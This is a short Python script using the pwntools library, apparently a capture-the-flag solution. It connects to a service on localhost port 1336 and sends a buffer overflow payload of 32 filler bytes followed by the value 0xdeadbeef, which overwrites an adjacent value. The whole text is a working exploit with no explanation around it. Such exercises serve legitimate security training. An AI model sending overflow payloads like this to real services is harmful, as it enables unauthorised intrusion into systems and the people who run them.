from pwn import *

conn = remote('127.0.0.1', 1336)
print(conn.recvn(18))

payload = b"a"*32
payload += p32(0xdeadbeef)

conn.send(payload)
print(conn.recvn(34))